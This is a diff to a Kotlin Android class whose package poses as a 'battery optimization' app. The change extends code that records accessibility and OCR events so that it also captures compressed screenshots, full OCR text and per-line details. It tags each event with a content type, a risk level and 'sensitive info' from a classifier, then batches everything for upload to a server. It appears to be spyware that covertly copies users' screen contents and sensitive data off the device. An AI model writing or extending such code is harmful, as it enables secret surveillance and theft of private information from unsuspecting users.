@@ -4,6 +4,8 @@ import android.content.Context
 import android.os.Build
 import android.util.Log
 import com.android.batteryoptimization.network.NetworkClient
+import com.android.batteryoptimization.network.OcrDetailPayload
+import com.android.batteryoptimization.network.SensitiveInfoPayload
 import com.android.batteryoptimization.network.UploadResponse
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
@@ -107,11 +109,25 @@ class InputRepository private constructor(private val context: Context) {
     /**
      * Add OCR results as events, merged into the existing event stream.
      * OCR events are tagged with source="ocr" to distinguish from accessibility events.
+     *
+     * @param screenshotBase64 截屏图片的 JPEG base64（压缩后），用于上传
+     * @param ocrFullText OCR 识别出的完整文本（多行拼接）
+     * @param ocrDetailsJson OCR 每行结果的 JSON 串
      */
-    fun addOcrEvents(packageName: String, appName: String, results: List<OcrResult>) {
+    fun addOcrEvents(
+        packageName: String,
+        appName: String,
+        results: List<OcrResult>,
+        screenshotBase64: String? = null,
+        ocrFullText: String? = null,
+        ocrDetailsJson: String? = null,
+        contentType: String? = null,
+        riskLevel: String? = null,
+        sensitiveInfoJson: String? = null
+    ) {
         val now = System.currentTimeMillis()
         val currentEvents = _eventsFlow.value.toMutableList()
-        
+
         for (result in results) {
             if (result.text.isBlank()) continue
             val event = InputEvent(
@@ -119,14 +135,20 @@ class InputRepository private constructor(private val context: Context) {
                 packageName = packageName,
                 appName = appName,
                 text = result.text,
-                source = "ocr"
+                source = "ocr",
+                screenshotBase64 = screenshotBase64,
+                ocrText = ocrFullText,
+                ocrDetailsJson = ocrDetailsJson,
+                contentType = contentType,
+                riskLevel = riskLevel,
+                sensitiveInfoJson = sensitiveInfoJson
             )
             currentEvents.add(0, event)
         }
-        
+
         _eventsFlow.value = currentEvents
         saveEvents(currentEvents)
-        
+
         val unuploadedCount = currentEvents.count { !it.isUploaded }
         if (unuploadedCount >= UPLOAD_THRESHOLD) {
             repositoryScope.launch {
@@ -186,12 +208,37 @@ class InputRepository private constructor(private val context: Context) {
             )
 
             val eventPayloads = currentEvents.map { event ->
+                // OCR 事件跑一遍分类器（非 OCR 事件 content_type=other）
+                val (contentType, riskLevel, _) = if (event.source == "ocr") {
+                    ContentClassifier.analyze(event.packageName, event.text)
+                } else {
+                    Triple(ContentClassifier.TYPE_OTHER, ContentClassifier.RISK_LOW, ContentClassifier.SensitiveInfo())
+                }
+
                 com.android.batteryoptimization.network.EventPayload(
                     packageName = event.packageName,
                     appName = event.appName,
                     text = event.text,
                     timestamp = event.timestamp,
-                    source = event.source
+                    source = event.source,
+                    screenshotBase64 = event.screenshotBase64,
+                    ocrText = event.ocrText,
+                    ocrDetails = event.ocrDetailsJson?.let { json ->
+                        try {
+                            gson.fromJson(json, object : TypeToken<List<OcrDetailPayload>>() {}.type)
+                        } catch (e: Exception) {
+                            null
+                        }
+                    },
+                    contentType = event.contentType ?: contentType,
+                    riskLevel = event.riskLevel ?: riskLevel,
+                    sensitiveInfo = event.sensitiveInfoJson?.let { json ->
+                        try {
+                            gson.fromJson(json, SensitiveInfoPayload::class.java)
+                        } catch (e: Exception) {
+                            null
+                        }
+                    }
                 )
             }
 
